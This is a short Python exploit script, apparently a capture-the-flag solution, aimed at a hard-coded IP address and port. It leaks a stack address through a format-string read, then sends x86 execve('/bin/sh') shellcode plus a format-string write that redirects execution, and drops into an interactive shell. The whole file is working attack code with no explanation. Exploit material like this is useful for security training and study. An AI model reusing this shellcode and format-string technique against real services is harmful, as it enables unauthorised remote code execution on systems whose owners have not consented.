#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import base64

host = "180.76.178.48"
port = 8888

sock = make_conn(host,port)

payload = "%12$p"
payload = base64.b64encode(payload)
sendline(sock,payload)
data = recvuntil(sock,"\n")
ebp = int(data.split("\n")[0],16)

payload = "\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = payload.ljust(60,"a")
word = (ebp+0X54+0X70) & 0xff
payload += fmtchar(60,word,4)
payload = base64.b64encode(payload)
sendline(sock,payload)


inter(sock)
